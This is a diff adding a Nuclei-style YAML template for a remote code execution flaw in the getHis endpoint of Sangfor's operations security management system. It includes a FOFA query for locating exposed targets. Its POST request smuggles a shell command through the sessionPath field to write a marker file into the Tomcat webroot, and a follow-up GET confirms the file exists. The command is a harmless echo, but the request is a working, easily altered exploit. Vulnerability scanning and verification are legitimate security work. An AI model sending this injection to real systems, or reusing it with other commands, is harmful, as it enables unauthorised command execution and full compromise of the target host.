@@ -1,0 +1,37 @@
+id: sangfor-aom-gethis-rce
+info:
+  name: 深信服运维安全管理系统getHis接口远程代码执行
+  author: 0dayPoc
+  severity: high
+  description: |-
+    深信服运维安全管理系统通过getHis接口实现历史数据获取功能，但存在未经充分验证的远程代码执行缺陷。攻击者可构造恶意请求载荷，利用该接口执行任意系统命令，最终导致目标系统被完全控制。
+
+    fofa: body="/fort/login" && header="FORTSESSIONID"
+    reference: 深信服运维安全管理系统通过getHis接口实现历史数据获取功能，但存在未经充分验证的远程代码执行缺陷。攻击者可构造恶意请求载荷，利用该接口执行任意系统命令，最终导致目标系统被完全控制。
+  tags: 深信服运维安全管理系统
+
+flow: http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /isomp-protocol/protocol/getHis HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip
+    Connection: keep-alive
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    sessionPath=;echo NdayTest>/usr/local/tomcat/webapps/isomp-protocol/NTest.txt;&sid=1
+- raw:
+  - |
+    GET /isomp-protocol/NTest.txt HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - NdayTest
